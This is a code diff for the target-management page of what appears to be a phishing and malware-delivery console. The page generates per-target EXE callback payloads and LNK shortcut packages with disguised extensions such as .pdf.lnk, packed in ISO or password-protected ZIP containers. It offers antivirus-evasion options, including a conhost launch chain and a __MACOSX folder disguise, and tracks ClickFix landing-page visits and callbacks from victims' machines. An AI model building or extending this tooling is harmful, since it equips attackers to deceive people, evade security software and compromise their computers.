@@ -6,7 +6,7 @@
 <div class="page-header">
     <div>
         <h1 class="page-title">目标管理</h1>
-        <p class="page-sub">维护演练目标、绑定 EXE 并跟踪上线状态。</p>
+        <p class="page-sub">生成投放文件、分发落地页，并查看每次回传的实机数据。</p>
     </div>
     <div class="page-actions">
         <a class="btn btn-secondary" href="{{ url_for('routes_web.batch_add_targets') }}">
@@ -34,20 +34,14 @@
                 目标列表
                 <span class="badge badge-muted">{{ pagination.total }}</span>
             </div>
-            <div class="card-sub">EXE 文件名留空时使用统一名称模板。</div>
+            <div class="card-sub">详情展示分页回传记录；已生成文件可直接下载或删除。</div>
         </div>
         <div class="card-head-actions">
-            <button class="btn btn-secondary btn-sm" type="button" onclick="batchBuild()" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
+            <button id="batchGenerateBtn" class="btn btn-secondary btn-sm" type="button" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
                 <svg class="icon" aria-hidden="true"><use href="#i-zap"></use></svg>
-                批量生成 EXE
+                批量生成
             </button>
-            {% if bypass_enabled %}
-            <button class="btn btn-secondary btn-sm" type="button" onclick="batchBuildLnk()" {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
-                <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
-                批量生成 LNK
-            </button>
-            {% endif %}
-            <button class="btn btn-danger btn-sm" type="button" onclick="batchDelete()">
+            <button id="batchDeleteBtn" class="btn btn-danger btn-sm" type="button">
                 <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
                 批量删除
             </button>
@@ -62,9 +56,17 @@
     </div>
 
     {% if targets %}
-    <div class="table-hint">左右滚动查看全部列 →</div>
     <div class="table-wrap">
-        <table class="table table-wide" id="targetsTable">
+        <table class="table table-targets" id="targetsTable">
+            <colgroup>
+                <col class="col-check">
+                <col>
+                <col class="col-dept">
+                <col class="col-callback">
+                {% if bypass_enabled and landing_enabled %}<col class="col-landing">{% endif %}
+                <col class="col-files">
+                <col class="col-actions">
+            </colgroup>
             <thead>
                 <tr>
                     <th class="checkbox-cell">
@@ -72,12 +74,9 @@
                     </th>
                     <th>目标</th>
                     <th class="hide-sm">部门</th>
-                    <th>EXE 文件名</th>
-                    <th>Token</th>
-                    <th>状态</th>
-                    <th>点击</th>
+                    <th>回传</th>
                     {% if bypass_enabled and landing_enabled %}<th>落地页</th>{% endif %}
-                    <th class="hide-sm">创建时间</th>
+                    <th>已生成文件</th>
                     <th>操作</th>
                 </tr>
             </thead>
@@ -88,37 +87,32 @@
                         <input class="target-cb" type="checkbox" name="ids[]" value="{{ t.id }}" aria-label="选择 {{ t.name }}">
                     </td>
                     <td>
-                        <span class="cell-title">{{ t.name }}</span>
-                        <span class="cell-sub">{{ t.email or '未填写邮箱' }}</span>
+                        <div class="target-cell">
+                            <span class="cell-title">{{ t.name }}</span>
+                            <span class="cell-sub">{{ t.email or '未填写邮箱' }}</span>
+                            <button class="copy-chip token-chip" type="button" data-copy="{{ t.unique_token }}" title="复制完整 Token">
+                                <svg class="icon" aria-hidden="true"><use href="#i-copy"></use></svg>
+                                <span>{{ t.unique_token[:8] }}</span>
+                            </button>
+                        </div>
                     </td>
                     <td class="hide-sm">{{ t.department or '—' }}</td>
                     <td>
-                        {% if t.exe_filename %}
-                        <span class="mono">{{ t.exe_filename }}</span>
-                        {% else %}
-                        <span class="muted">使用模板</span>
-                        {% endif %}
+                        <div class="callback-cell">
+                            {% if t.callback_count %}
+                            <span class="badge badge-success"><span class="dot"></span>上线</span>
+                            <span class="callback-count num">{{ t.callback_count }}</span>
+                            {% else %}
+                            <span class="badge badge-muted"><span class="dot"></span>未上线</span>
+                            {% endif %}
+                        </div>
                     </td>
-                    <td>
-                        <button class="copy-chip" type="button" data-copy="{{ t.unique_token }}" title="复制完整 Token">
-                            <svg class="icon" aria-hidden="true"><use href="#i-copy"></use></svg>
-                            <span>{{ t.unique_token[:8] }}…</span>
-                        </button>
-                    </td>
-                    <td>
-                        {% if t.callback_count %}
-                        <span class="badge badge-success"><span class="dot"></span>上线</span>
-                        {% else %}
-                        <span class="badge badge-muted"><span class="dot"></span>未上线</span>
-                        {% endif %}
-                    </td>
-                    <td class="num">{{ t.callback_count }}</td>
                     {% if bypass_enabled and landing_enabled %}
                     <td>
                         <div class="landing-cell">
                             <button class="copy-chip" type="button" data-copy="{{ t.landing_url }}" title="复制 ClickFix 落地页链接">
                                 <svg class="icon" aria-hidden="true"><use href="#i-globe"></use></svg>
-                                <span>落地页</span>
+                                <span>链接</span>
                             </button>
                             <span class="visit-pill{% if t.landing_visits %} is-live{% endif %}" title="落地页访问次数">
                                 {% if t.landing_visits %}<span class="pulse-dot"></span>{% endif %}{{ t.landing_visits or 0 }}
@@ -126,52 +120,52 @@
                         </div>
                     </td>
                     {% endif %}
-                    <td class="hide-sm"><span class="num">{{ t.created_at }}</span></td>
                     <td>
-                        <div class="row-actions">
-                            <a class="btn btn-secondary btn-sm"
-                               href="{{ url_for('routes_web.target_detail', target_id=t.id) }}"
-                               data-detail-url="{{ url_for('routes_web.target_detail', target_id=t.id) }}"
-                               data-detail-title="目标详情 · {{ t.name }}">详情</a>
-                            <button id="btn-gen-{{ t.id }}" class="btn btn-secondary btn-sm" type="button"
-                                    data-default-label="{% if t.exe_exists %}重新生成{% else %}生成 EXE{% endif %}"
-                                    onclick="buildExe({{ t.id }})"
-                                    {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
-                                {% if t.exe_exists %}重新生成{% else %}生成 EXE{% endif %}
-                            </button>
-                            {% if bypass_enabled %}
-                            <button id="btn-lnk-{{ t.id }}" class="btn btn-secondary btn-sm" type="button"
-                                    data-default-label="{% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}"
-                                    onclick="buildLnkPackage({{ t.id }})"
-                                    {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>
-                                <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
-                                {% if t.lnk_exists %}重新生成 LNK{% else %}生成 LNK{% endif %}
-                            </button>
-                            {% endif %}
-                            <span id="exe-actions-{{ t.id }}" class="row-actions" {% if not t.exe_exists %}style="display:none;"{% endif %}>
-                                <a id="btn-dl-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_web.download_exe_from_target', target_id=t.id) }}" title="下载 EXE">
-                                    <svg class="icon" aria-hidden="true"><use href="#i-download"></use></svg>
+                        <div class="file-list">
+                            {% if t.exe_file %}
+                            <div class="file-row">
+                                <a class="file-link" href="{{ url_for('routes_web.download_exe_from_target', target_id=t.id) }}" title="下载 {{ t.exe_file }}">
+                                    <svg class="icon" aria-hidden="true"><use href="#i-box"></use></svg>
+                                    <span>{{ t.exe_file }}</span>
                                 </a>
-                                <form class="inline-form" action="{{ url_for('routes_web.delete_exe_from_target', target_id=t.id) }}" method="POST"
-                                      data-confirm="确认删除该目标的 EXE 文件？" data-confirm-danger data-confirm-ok="删除">
-                                    <button class="btn btn-ghost btn-sm danger-text" type="submit" title="删除该目标的 EXE">
-                                        <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
+                                <form class="file-del-form" action="{{ url_for('routes_web.delete_exe_from_target', target_id=t.id) }}" method="POST"
+                                      data-confirm="确认删除文件「{{ t.exe_file }}」？" data-confirm-danger data-confirm-ok="删除">
+                                    <button class="file-x" type="submit" title="删除 EXE" aria-label="删除 {{ t.exe_file }}">
+                                        <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
                                     </button>
                                 </form>
-                            </span>
-                            {% if bypass_enabled %}
-                            <span id="lnk-actions-{{ t.id }}" class="row-actions" {% if not t.lnk_exists %}style="display:none;"{% endif %}>
-                                <a id="btn-dl-lnk-{{ t.id }}" class="btn btn-ghost btn-sm" href="{{ url_for('routes_bypass.download_lnk_from_target', target_id=t.id) }}" title="下载 LNK 压缩包">
-                                    <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                            </div>
+                            {% endif %}
+                            {% if bypass_enabled and t.lnk_file %}
+                            <div class="file-row">
+                                <a class="file-link is-lnk" href="{{ url_for('routes_bypass.download_lnk_from_target', target_id=t.id) }}" title="下载 {{ t.lnk_file }}">
+                                    <svg class="icon" aria-hidden="true"><use href="{{ '#i-hard-drive' if t.lnk_file.endswith('.iso') else '#i-archive' }}"></use></svg>
+                                    <span>{{ t.lnk_file }}</span>
                                 </a>
-                                <form class="inline-form" action="{{ url_for('routes_bypass.delete_lnk_from_target', target_id=t.id) }}" method="POST"
-                                      data-confirm="确认删除该目标的 LNK 压缩包？" data-confirm-danger data-confirm-ok="删除">
-                                    <button class="btn btn-ghost btn-sm danger-text" type="submit" title="删除该目标的 LNK 压缩包">
-                                        <svg class="icon" aria-hidden="true"><use href="#i-trash"></use></svg>
+                                <form class="file-del-form" action="{{ url_for('routes_bypass.delete_lnk_from_target', target_id=t.id) }}" method="POST"
+                                      data-confirm="确认删除投递包「{{ t.lnk_file }}」？" data-confirm-danger data-confirm-ok="删除">
+                                    <button class="file-x" type="submit" title="删除投递包" aria-label="删除 {{ t.lnk_file }}">
+                                        <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
                                     </button>
                                 </form>
-                            </span>
+                            </div>
                             {% endif %}
+                            {% if not t.exe_file and not (bypass_enabled and t.lnk_file) %}
+                            <span class="file-empty">—</span>
+                            {% endif %}
+                        </div>
+                    </td>
+                    <td>
+                        <div class="row-actions row-actions-tight">
+                            <button class="btn btn-secondary btn-sm" type="button"
+                                    data-collections-url="{{ url_for('routes_web.target_collections_modal', target_id=t.id) }}"
+                                    data-collections-title="{{ t.name }} · 回传记录">详情</button>
+                            <button class="btn btn-secondary btn-sm" type="button"
+                                    data-generate-target="{{ t.id }}"
+                                    data-generate-name="{{ t.name }}"
+                                    data-generate-filename="{{ t.exe_filename or '' }}"
+                                    data-generate-artifact="{{ t.exe_file }}"
+                                    {% if not server_configured %}disabled title="请先在 EXE 配置页面设置服务器 IP"{% endif %}>生成</button>
                             <form class="inline-form" action="{{ url_for('routes_web.delete_target', target_id=t.id) }}" method="POST"
                                   data-confirm="确认删除目标「{{ t.name }}」及其所有关联数据？" data-confirm-danger data-confirm-ok="删除">
                                 <button class="btn btn-danger btn-sm" type="submit">删除</button>
@@ -196,224 +190,529 @@
     </div>
     {% endif %}
 </div>
+
+<template id="genModalTpl">
+    <div class="modal is-form" role="dialog" aria-modal="true" aria-labelledby="genModalTitle">
+        <div class="modal-head">
+            <div class="modal-head-main">
+                <div class="modal-title" id="genModalTitle" data-gen-title>生成投放文件</div>
+                <div class="modal-text" data-gen-sub></div>
+            </div>
+            <button type="button" class="modal-close" data-gen-close aria-label="关闭">
+                <svg class="icon" aria-hidden="true"><use href="#i-x"></use></svg>
+            </button>
+        </div>
+        <div class="modal-body">
+            <div class="gen-kind" role="tablist" aria-label="文件类型">
+                <button type="button" class="gen-kind-btn is-active" role="tab" aria-selected="true" data-gen-kind="exe">
+                    <svg class="icon" aria-hidden="true"><use href="#i-box"></use></svg>
+                    <span class="gen-kind-text">
+                        <strong>EXE 载荷</strong>
+                        <small>回传程序</small>
+                    </span>
+                </button>
+                {% if bypass_enabled %}
+                <button type="button" class="gen-kind-btn" role="tab" aria-selected="false" data-gen-kind="lnk">
+                    <svg class="icon" aria-hidden="true"><use href="#i-archive"></use></svg>
+                    <span class="gen-kind-text">
+                        <strong>LNK 投递</strong>
+                        <small>快捷方式压缩包</small>
+                    </span>
+                </button>
+                {% endif %}
+            </div>
+
+            <div class="gen-panel" data-gen-panel="exe">
+                <div class="form-group" data-gen-filename-group>
+                    <label for="genFilename">输出文件名</label>
+                    <input id="genFilename" class="mono" type="text" data-gen-filename placeholder="留空则使用目标文件名或全局模板" autocomplete="off">
+                    <span class="help">仅对本次生成生效，无需填写 <code>.exe</code> 后缀。</span>
+                </div>
+                <p class="help" data-gen-batch-note hidden>批量生成将对每个目标使用其已保存的文件名或全局名称模板，避免重名冲突。</p>
+                <div class="gen-preview">
+                    <svg class="icon icon-sm" aria-hidden="true"><use href="#i-eye"></use></svg>
+                    <span>预计输出</span>
+                    <code data-gen-preview>—</code>
+                </div>
+            </div>
+
+            {% if bypass_enabled %}
+            <div class="gen-panel is-hidden" data-gen-panel="lnk">
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label for="genLureExt">伪装后缀</label>
+                        <select id="genLureExt" data-lnk-lure>
+                            {% for ext in lnk_lure_choices %}
+                            <option value="{{ ext }}" {% if lnk_defaults.lure_ext == ext %}selected{% endif %}>{{ ext }}</option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="genZipPassword">ZIP 加密密码</label>
+                        <input id="genZipPassword" class="mono" type="text" data-lnk-password value="{{ lnk_defaults.password }}" placeholder="仅 ISO + 密码 ZIP 生效" autocomplete="off">
+                    </div>
+                </div>
+                <div class="form-group">
+                    <span class="form-label">投递容器</span>
+                    <div class="container-grid">
+                        {% for key, label, desc in lnk_container_choices %}
+                        <label class="container-option{% if lnk_defaults.container == key %} is-active{% endif %}">
+                            <input type="radio" name="gen_container" value="{{ key }}" {% if lnk_defaults.container == key %}checked{% endif %}>
+                            <span class="container-text">
+                                <strong>{{ label }}</strong>
+                                <small>{{ desc }}</small>
+                            </span>
+                            <span class="container-radio" aria-hidden="true"></span>
+                        </label>
+                        {% endfor %}
+                    </div>
+                </div>
+                <div class="form-group">
+                    <span class="form-label">免杀方式</span>
+                    <div class="evasion-grid">
+                        {% for key, label, desc in lnk_evasion_options %}
+                        <label class="evasion-option{% if key == 'conhost' %} is-locked is-ok{% endif %}">
+                            <input type="checkbox" value="{{ key }}" data-evasion-key {% if key == 'conhost' %}checked disabled{% elif key in lnk_defaults.evasion %}checked{% endif %}>
+                            <span class="evasion-text">
+                                <strong>{{ label }}</strong>
+                                <small>{{ desc }}</small>
+                            </span>
+                        </label>
+                        {% endfor %}
+                    </div>
+                    <span class="help">conhost 启动链始终启用；可叠加 __MACOSX 伪装隐藏载荷目录。</span>
+                </div>
+                <label class="switch">
+                    <input type="checkbox" data-lnk-save>
+                    <span class="switch-text">
+                        <strong>保存为默认设置</strong>
+                        <span>下次生成时沿用本次 LNK 投递选项。</span>
+                    </span>
+                </label>
+                <div class="gen-preview">
+                    <svg class="icon icon-sm" aria-hidden="true"><use href="#i-archive"></use></svg>
+                    <span>预计输出</span>
+                    <code data-gen-preview>—</code>
+                </div>
+            </div>
+            {% endif %}
+        </div>
+        <div class="modal-foot">
+            <span class="modal-foot-note" data-gen-note></span>
+            <button type="button" class="btn btn-secondary" data-gen-close>取消</button>
+            <button type="button" class="btn btn-primary" data-gen-submit>
+                <svg class="icon" aria-hidden="true"><use href="#i-zap"></use></svg>
+                <span data-gen-submit-label>开始生成</span>
+            </button>
+        </div>
+    </div>
+</template>
 {% endblock %}
 
 {% block scripts %}
 <script>
-function getCheckedIds() {
-    return Array.from(document.querySelectorAll('.target-cb:checked')).map(function (cb) {
-        return cb.value;
-    });
-}
+(function () {
+    'use strict';
 
-function notify(message, type) {
-    if (window.FishUI) {
-        FishUI.toast(message, type);
-    } else {
-        alert(message);
-    }
-}
+    var ADMIN = '{{ admin_path }}';
+    var SERVER_CONFIGURED = {{ 'true' if server_configured else 'false' }};
+    {% if bypass_enabled %}
+    var LNK_DEFAULTS = {{ lnk_defaults|tojson }};
+    {% endif %}
 
-function confirmAction(message, okText, onOk) {
-    if (window.FishUI && FishUI.confirm) {
-        FishUI.confirm(message, { danger: true, okText: okText || '删除' }).then(function (ok) {
-            if (ok) onOk();
-        });
-    } else if (confirm(message)) {
-        onOk();
-    }
-}
-
-function batchDelete() {
-    var ids = getCheckedIds();
-    if (ids.length === 0) {
-        notify('请先选择目标', 'error');
-        return;
-    }
-    confirmAction('确认删除选中的 ' + ids.length + ' 个目标及其所有数据？', '删除', function () {
-        var form = document.createElement('form');
-        form.method = 'POST';
-        form.action = '{{ admin_path }}/targets/batch_delete';
-        ids.forEach(function (id) {
-            var input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'ids[]';
-            input.value = id;
-            form.appendChild(input);
-        });
-        document.body.appendChild(form);
-        form.submit();
-    });
-}
-
-function batchBuild() {
-    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
-    var ids = getCheckedIds();
-    if (ids.length === 0) {
-        notify('请先选择目标', 'error');
-        return;
-    }
-
-    ids.forEach(function (id) {
-        var genBtn = document.getElementById('btn-gen-' + id);
-        if (genBtn && !genBtn.disabled) {
-            genBtn.disabled = true;
-            genBtn.textContent = '打包中…';
+    function notify(message, type) {
+        if (window.FishUI) {
+            FishUI.toast(message, type);
+        } else {
+            alert(message);
         }
-    });
-
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = '{{ admin_path }}/targets/batch_build_exe';
-    ids.forEach(function (id) {
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'ids[]';
-        input.value = id;
-        form.appendChild(input);
-    });
-    document.body.appendChild(form);
-
-    fetch(form.action, { method: 'POST', body: new FormData(form) })
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-            notify(data.message || '已开始批量生成', 'success');
-        })
-        .catch(function () {
-            notify('批量生成请求失败', 'error');
-        });
-}
-
-{% if bypass_enabled %}
-function batchBuildLnk() {
-    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
-    var ids = getCheckedIds();
-    if (ids.length === 0) {
-        notify('请先选择目标', 'error');
-        return;
     }
 
-    ids.forEach(function (id) {
-        var btn = document.getElementById('btn-lnk-' + id);
-        if (btn && !btn.disabled) {
-            btn.disabled = true;
-            btn.textContent = '打包中…';
+    function getCheckedIds() {
+        return Array.from(document.querySelectorAll('.target-cb:checked')).map(function (cb) {
+            return cb.value;
+        });
+    }
+
+    function batchDelete() {
+        var ids = getCheckedIds();
+        if (ids.length === 0) {
+            notify('请先选择目标', 'error');
+            return;
         }
-    });
+        var run = function () {
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = ADMIN + '/targets/batch_delete';
+            ids.forEach(function (id) {
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = 'ids[]';
+                input.value = id;
+                form.appendChild(input);
+            });
+            document.body.appendChild(form);
+            form.submit();
+        };
+        if (window.FishUI && FishUI.confirm) {
+            FishUI.confirm('确认删除选中的 ' + ids.length + ' 个目标及其所有数据？', {
+                danger: true, okText: '删除'
+            }).then(function (ok) { if (ok) run(); });
+        } else if (confirm('确认删除选中的 ' + ids.length + ' 个目标及其所有数据？')) {
+            run();
+        }
+    }
 
-    var form = document.createElement('form');
-    form.method = 'POST';
-    form.action = '{{ admin_path }}/targets/batch_build_lnk';
-    ids.forEach(function (id) {
-        var input = document.createElement('input');
-        input.type = 'hidden';
-        input.name = 'ids[]';
-        input.value = id;
-        form.appendChild(input);
-    });
-    document.body.appendChild(form);
+    /* ---- Build completion polling ---- */
+    var pendingTargets = {};
 
-    fetch(form.action, { method: 'POST', body: new FormData(form) })
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-            if (data.status !== 'ok') {
-                notify('批量生成失败: ' + (data.message || '请求被拒绝'), 'error');
-                ids.forEach(function (id) {
-                    var btn = document.getElementById('btn-lnk-' + id);
-                    if (btn) btn.disabled = false;
+    function refreshBuildStatus() {
+        fetch(ADMIN + '/build_status_all', { cache: 'no-store' })
+            .then(function (r) { return r.json(); })
+            .then(function (statuses) {
+                var pending = Object.keys(pendingTargets);
+                if (pending.length === 0) {
+                    return;
+                }
+                var waiting = false;
+                var failed = false;
+                pending.forEach(function (id) {
+                    var status = statuses[id];
+                    if (!status || status.status === 'building') {
+                        waiting = true;
+                    } else if (status.status === 'error') {
+                        failed = true;
+                        delete pendingTargets[id];
+                    } else {
+                        delete pendingTargets[id];
+                    }
                 });
+                if (waiting) {
+                    return;
+                }
+                if (failed) {
+                    notify('部分目标生成失败，请检查服务端日志', 'error');
+                }
+                if (Object.keys(pendingTargets).length === 0) {
+                    window.setTimeout(function () { location.reload(); }, 500);
+                }
+            })
+            .catch(function () { /* ignore polling errors */ });
+    }
+
+    refreshBuildStatus();
+    window.setInterval(refreshBuildStatus, 3000);
+
+    /* ---- Generation modal ---- */
+    var genBackdrop = null;
+
+    function closeGenerateModal() {
+        if (!genBackdrop) {
+            return;
+        }
+        var node = genBackdrop;
+        genBackdrop = null;
+        if (node._genKey) {
+            document.removeEventListener('keydown', node._genKey);
+        }
+        node.classList.remove('open');
+        window.setTimeout(function () {
+            if (node.parentNode) {
+                node.parentNode.removeChild(node);
+            }
+        }, 180);
+    }
+
+    function topModalLayer() {
+        var layers = document.querySelectorAll('[data-modal-layer]');
+        return layers.length ? layers[layers.length - 1] : null;
+    }
+
+    function fillLnkDefaults(root) {
+        {% if bypass_enabled %}
+        var lure = root.querySelector('[data-lnk-lure]');
+        if (lure) {
+            lure.value = LNK_DEFAULTS.lure_ext;
+        }
+        var password = root.querySelector('[data-lnk-password]');
+        if (password) {
+            password.value = LNK_DEFAULTS.password || '';
+        }
+        root.querySelectorAll('input[name="gen_container"]').forEach(function (input) {
+            input.checked = input.value === LNK_DEFAULTS.container;
+        });
+        root.querySelectorAll('[data-evasion-key]').forEach(function (input) {
+            if (input.disabled) {
                 return;
             }
-            notify(data.message || '已生成 LNK 包', 'success');
-            setTimeout(function () { location.reload(); }, 800);
-        })
-        .catch(function () {
-            notify('批量生成 LNK 请求失败', 'error');
+            input.checked = (LNK_DEFAULTS.evasion || []).indexOf(input.value) !== -1;
         });
-}
-{% endif %}
+        {% endif %}
+    }
 
-function buildExe(targetId) {
-    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
-    var genBtn = document.getElementById('btn-gen-' + targetId);
-    var defaultLabel = genBtn.getAttribute('data-default-label') || '生成 EXE';
-    genBtn.disabled = true;
-    genBtn.textContent = '打包中…';
+    function syncContainerStyle(root) {
+        root.querySelectorAll('.container-option').forEach(function (option) {
+            var input = option.querySelector('input[name="gen_container"]');
+            option.classList.toggle('is-active', !!input && input.checked);
+        });
+    }
 
-    fetch('{{ admin_path }}/targets/' + targetId + '/build_exe', { method: 'POST' })
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-            if (data.status !== 'ok') {
-                notify('生成失败: ' + (data.message || '未知错误'), 'error');
-                genBtn.disabled = false;
-                genBtn.textContent = defaultLabel;
-            } else {
-                notify('已开始生成，完成后可下载', 'success');
+    function previewBase(state) {
+        if (state.mode === 'single') {
+            var input = genBackdrop ? genBackdrop.querySelector('[data-gen-filename]') : null;
+            var typed = input ? input.value.trim() : '';
+            if (typed) {
+                return typed.replace(/\.exe$/i, '');
             }
-        })
-        .catch(function () {
-            notify('生成请求失败', 'error');
-            genBtn.disabled = false;
-            genBtn.textContent = defaultLabel;
-        });
-}
-
-{% if bypass_enabled %}
-function buildLnkPackage(targetId) {
-    {% if not server_configured %}notify('请先在 EXE 配置页面设置服务器 IP', 'error'); return;{% endif %}
-    var btn = document.getElementById('btn-lnk-' + targetId);
-    var defaultLabel = btn.getAttribute('data-default-label') || '生成 LNK';
-    btn.disabled = true;
-    btn.textContent = '打包中…';
-
-    fetch('{{ admin_path }}/targets/' + targetId + '/build_lnk', { method: 'POST' })
-        .then(function (r) { return r.json(); })
-        .then(function (data) {
-            if (data.status !== 'ok') {
-                notify('生成失败: ' + (data.message || '未知错误'), 'error');
-                btn.disabled = false;
-                btn.textContent = defaultLabel;
-            } else {
-                notify(data.message || 'LNK 包已生成', 'success');
-                setTimeout(function () { location.reload(); }, 700);
+            if (state.filename) {
+                return state.filename.replace(/\.exe$/i, '');
             }
-        })
-        .catch(function () {
-            notify('生成 LNK 包请求失败', 'error');
-            btn.disabled = false;
-            btn.textContent = defaultLabel;
+            if (state.artifact) {
+                return state.artifact.replace(/\.(exe|zip|iso)$/i, '');
+            }
+        }
+        return '名称模板';
+    }
+
+    function updatePreviews(state) {
+        if (!genBackdrop) {
+            return;
+        }
+        var base = previewBase(state);
+        var exePreview = genBackdrop.querySelector('[data-gen-panel="exe"] [data-gen-preview]');
+        if (exePreview) {
+            exePreview.textContent = base + '.exe';
+        }
+        {% if bypass_enabled %}
+        var lnkPreview = genBackdrop.querySelector('[data-gen-panel="lnk"] [data-gen-preview]');
+        var lure = genBackdrop.querySelector('[data-lnk-lure]');
+        var containerInput = genBackdrop.querySelector('input[name="gen_container"]:checked');
+        if (lnkPreview) {
+            var ext = lure ? lure.value : 'pdf';
+            var suffix = (containerInput && containerInput.value === 'iso') ? '.iso' : '.zip';
+            lnkPreview.textContent = base + '.' + ext + '.lnk  ·  ' + base + suffix;
+        }
+        {% endif %}
+    }
+
+    function setKind(state, kind) {
+        if (!genBackdrop) {
+            return;
+        }
+        genBackdrop.querySelectorAll('[data-gen-kind]').forEach(function (btn) {
+            var active = btn.getAttribute('data-gen-kind') === kind;
+            btn.classList.toggle('is-active', active);
+            btn.setAttribute('aria-selected', active ? 'true' : 'false');
         });
-}
-{% endif %}
+        genBackdrop.querySelectorAll('[data-gen-panel]').forEach(function (panel) {
+            panel.classList.toggle('is-hidden', panel.getAttribute('data-gen-panel') !== kind);
+        });
+        state.kind = kind;
+        updatePreviews(state);
+    }
 
-function refreshAllStatus() {
-    fetch('{{ admin_path }}/build_status_all')
-        .then(function (r) { return r.json(); })
-        .then(function (statuses) {
-            for (var targetId in statuses) {
-                var s = statuses[targetId];
-                var genBtn = document.getElementById('btn-gen-' + targetId);
-                var exeActions = document.getElementById('exe-actions-' + targetId);
-                if (!genBtn) continue;
+    function collectLnkOptions(root) {
+        var container = root.querySelector('input[name="gen_container"]:checked');
+        return {
+            lure_ext: root.querySelector('[data-lnk-lure]').value,
+            container: container ? container.value : 'zip',
+            password: root.querySelector('[data-lnk-password]').value.trim(),
+            evasion: Array.from(root.querySelectorAll('[data-evasion-key]:checked')).map(function (cb) {
+                return cb.value;
+            }),
+            save_defaults: root.querySelector('[data-lnk-save]').checked ? '1' : ''
+        };
+    }
 
-                if (s.status === 'building') {
-                    genBtn.disabled = true;
-                    genBtn.textContent = '打包中…';
-                } else if (s.status === 'done') {
-                    genBtn.disabled = false;
-                    genBtn.textContent = '重新生成';
-                    genBtn.setAttribute('data-default-label', '重新生成');
-                    if (exeActions) exeActions.style.display = '';
-                } else if (s.status === 'error') {
-                    genBtn.disabled = false;
-                    genBtn.textContent = genBtn.getAttribute('data-default-label') || '生成 EXE';
+    function submitGenerate(state, submitBtn, label) {
+        var root = genBackdrop;
+        var filenameInput = root.querySelector('[data-gen-filename]');
+        var filename = filenameInput ? filenameInput.value.trim() : '';
+        var request;
+
+        if (state.kind === 'exe' && state.mode === 'single') {
+            request = fetch(ADMIN + '/targets/' + state.targetId + '/build_exe', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ filename: filename })
+            });
+        } else if (state.kind === 'exe') {
+            var exeForm = new FormData();
+            state.ids.forEach(function (id) { exeForm.append('ids[]', id); });
+            request = fetch(ADMIN + '/targets/batch_build_exe', {
+                method: 'POST', body: exeForm
+            });
+        } else if (state.mode === 'single') {
+            request = fetch(ADMIN + '/targets/' + state.targetId + '/build_lnk', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(collectLnkOptions(root))
+            });
+        } else {
+            var lnkForm = new FormData();
+            state.ids.forEach(function (id) { lnkForm.append('ids[]', id); });
+            var options = collectLnkOptions(root);
+            Object.keys(options).forEach(function (key) {
+                if (key === 'evasion') {
+                    options.evasion.forEach(function (value) {
+                        lnkForm.append('evasion', value);
+                    });
+                } else {
+                    lnkForm.append(key, options[key]);
                 }
-            }
-        })
-        .catch(function () { /* 忽略轮询错误 */ });
-}
+            });
+            request = fetch(ADMIN + '/targets/batch_build_lnk', {
+                method: 'POST', body: lnkForm
+            });
+        }
 
-refreshAllStatus();
-setInterval(refreshAllStatus, 5000);
+        request
+            .then(function (response) {
+                return response.json().catch(function () {
+                    throw new Error('HTTP ' + response.status);
+                });
+            })
+            .then(function (data) {
+                if (data.status !== 'ok') {
+                    throw new Error(data.message || '生成请求被拒绝');
+                }
+                if (state.kind === 'exe') {
+                    var ids = state.mode === 'single' ? [state.targetId] : state.ids;
+                    ids.forEach(function (id) { pendingTargets[id] = true; });
+                    refreshBuildStatus();
+                    notify('已开始生成，完成后列表自动刷新', 'success');
+                } else {
+                    notify(data.message || 'LNK 投递包已生成', 'success');
+                    window.setTimeout(function () { location.reload(); }, 650);
+                }
+                closeGenerateModal();
+            })
+            .catch(function (err) {
+                notify('生成失败：' + err.message, 'error');
+                submitBtn.disabled = false;
+                submitBtn.querySelector('[data-gen-submit-label]') && (submitBtn.querySelector('[data-gen-submit-label]').textContent = label);
+                if (root) {
+                    root.classList.remove('is-busy');
+                }
+            });
+    }
+
+    function openGenerate(state) {
+        closeGenerateModal();
+        if (!SERVER_CONFIGURED) {
+            notify('请先在 EXE 配置页面设置服务器 IP', 'error');
+            return;
+        }
+        var tpl = document.getElementById('genModalTpl');
+        if (!tpl) {
+            return;
+        }
+        var backdrop = document.createElement('div');
+        backdrop.className = 'modal-backdrop';
+        backdrop.setAttribute('data-modal-layer', 'generate');
+        backdrop.appendChild(tpl.content.cloneNode(true));
+        document.body.appendChild(backdrop);
+        genBackdrop = backdrop;
+        window.requestAnimationFrame(function () {
+            backdrop.classList.add('open');
+        });
+
+        var title = backdrop.querySelector('[data-gen-title]');
+        var sub = backdrop.querySelector('[data-gen-sub]');
+        var filenameGroup = backdrop.querySelector('[data-gen-filename-group]');
